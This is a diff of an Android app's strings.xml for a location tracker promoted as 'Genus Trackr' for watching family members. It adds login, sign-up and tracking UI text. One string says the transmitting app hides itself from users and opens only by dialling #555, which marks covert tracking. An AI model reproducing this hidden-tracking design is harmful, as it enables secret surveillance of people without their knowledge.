@@ -1,14 +1,36 @@
+<?xml version="1.0" encoding="utf-8"?>
 <resources>
     <string name="app_name">LocationTracker</string>
-
-    <string name="title_section1">Section 1</string>
-    <string name="title_section2">Section 2</string>
-    <string name="title_section3">Section 3</string>
-
-    <string name="navigation_drawer_open">Open navigation drawer</string>
-    <string name="navigation_drawer_close">Close navigation drawer</string>
-
-    <string name="action_example">Example action</string>
-
     <string name="action_settings">Settings</string>
+    <string name="instructions">Instructions</string>
+    <string name="account_inexistence">account does not exist, please try again or create an account</string>
+    <string name="something_went_wrong">ups, something went wrong</string>
+    <string name="incomplete_fields">please fill all required fields</string>
+    <string name="account_created">account successfully created</string>
+    <string name="user_in_user">this username is already in use</string>
+    <string name="privacy_policy">privacy_policy</string>
+    <string name="url_api">http://android-phone.webuda.com/</string>
+    <string name="sign_up">Sign up</string>
+    <string name="share_text">Genus Trackr is a very accurate cell phone tracker service to monitor your family using GPS tracking technology.\nA safe way to track the location of your kids on the map 24 hours per day \nPeace of mind for you when you are not close of your loved ones. All they need is an Android phone with the App installed."</string>
+    <string name="share_text_title">share to..</string>
+    <string name="yes">Yes</string>
+    <string name="no">No</string>
+    <string name="transmitter">Transmitter</string>
+    <string name="receptor">"Receptor"</string>
+    <string name="unknown">Unknown</string>
+    <string name="fail_message_one">Failed to delete \'</string>
+    <string name="fail_message_two">\'</string>
+    <string name="tutorial">Tutorial</string>
+    <string name="tutorial_text">We are sorry you are not following any devices watch the tutorial to find out how</string>
+    <string name="delete_part_one">Do you really want to stop tracking \'</string>
+    <string name="delete_part_two">\' ?</string>
+    <string name="no_location">this device contains no locations</string>
+    <string name="warning_text">Are you sure \?\nWarning ! \n[ you will only be asked once ]</string>
+    <string name="decision">"How would you like to use this application ?"</string>
+    <string name="nickname_exist">nickname already exist, please choose another</string>
+    <string name="wrong_user_pass">wrong credentials</string>
+    <string name="transmitter_text">This Application is now sending updates it is also hidden from the users, in order to launch it dial #555 </string>
+    <string name="checking_user_info">checking user information...</string>
+    <string name="registering_account">"Registering account..."</string>
+
 </resources>
